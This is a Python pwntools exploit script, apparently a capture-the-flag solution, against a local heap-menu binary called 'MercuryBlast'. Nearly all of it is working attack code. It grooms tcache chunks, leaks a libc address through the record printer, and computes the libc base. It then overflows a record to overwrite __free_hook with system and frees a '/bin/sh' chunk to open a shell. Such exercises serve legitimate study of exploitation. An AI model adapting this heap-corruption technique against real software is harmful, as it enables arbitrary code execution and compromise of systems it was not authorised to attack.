from pwn import * 

binary = "./MercuryBlast"
p = process(binary)
s = '''
b * add_record
b * edit_record+384
b * delete_record
'''
# add_record+334 before read()
#b * print_records+223
context.log_level = 'debug'
libc = ELF('./libc.so.6')
elf = ELF(binary)


def add_record(size, data):
    p.sendlineafter("Your choice: ", "1")
    p.sendlineafter("Input Temperature:", "1")
    p.sendlineafter("Input Description Size: ", str(size))
    p.sendafter("Input Description: ", data)

def edit_record(index, size, buffer): # size <= 0x200
    p.sendlineafter("Your choice: ", "4")
    p.sendlineafter("Input index: ", str(index))
    p.sendlineafter("Input Temperature: ", "1")
    p.sendlineafter("Input Description Size: ", str(size))
    p.sendafter("Input Description: ", buffer)

def delete_record(idx):
    p.sendlineafter("Your choice: ", "3")
    p.sendlineafter("Input Index:", str(idx))

def print_record():
    p.sendlineafter("Your choice: ", "2")
    #print(p.clean().decode())

add_record(0x200, b'AAAAAAAA') # 0 
add_record(0x200, b'AAAAAAAA') #1
add_record(0x200, b'AAAAAAAA') #2
add_record(0x200, b'AAAAAAAA') #3
add_record(0x200, b'AAAAAAAA') #4
add_record(0x200, b'AAAAAAAA') #5
add_record(0x200, b'AAAAAAAA') #6
add_record(0x200, b'AAAAAAAA') #7

delete_record(0)
delete_record(1)
delete_record(2)
delete_record(3)
delete_record(4)
delete_record(5)
delete_record(7)
delete_record(6)
gdb.attach(p, s)
add_record(0x200, b'AAAAAAAA') #0, 7
add_record(0x200, b'AAAAAAAA') #1, 5
add_record(0x200, b'AAAAAAAA') #2, 4
add_record(0x200, b'AAAAAAAA')#3, 6
add_record(0x200, b'AAAAAAAA')#4, 6
add_record(0x200, b'AAAAAAAA')#5, 6
add_record(0x200, b'AAAAAAAA')#6, 6
add_record(0x10, b'BBBBBBBB')#7, 6
print_record()

#edit_record(0, 0x200, payload)
p.recvuntil(b"Description: BBBBBBBB")
leak = p.recvuntil(b'\x7f')[:6].ljust(8, b'\x00')
leak = u64(leak)
#print(hex(leak))
#pwndbg> x/20x 0x7fc6b1288de0 - 0x7fc6b109c000
#0x1ecde0:	Cannot access memory at address 0x1ecde0
libc.address =  leak - 0x1ecde0 # actual libc base, verified with outputs and vmmp in pwndbg
#print(hex(libc.address))
sys_addr = libc.sym['system']
free_hook = libc.sym['__free_hook']
add_record(0x200, b'AAAAAAAA')
add_record(0x100, b'AAAAAAAA')
add_record(0x200, b'AAAAAAAA')
print(hex(libc.address))
edit_record(9, 0x200, b'A' * 0x100 + p64(0) + p64(0x21) + p64(0) + p64(0x100) + p64(free_hook))
edit_record(10, 0x8, p64(sys_addr))

edit_record(3, 0x8, b'/bin/sh\x00')
delete_record(3)


# now start arbirary write! using read()

p.interactive()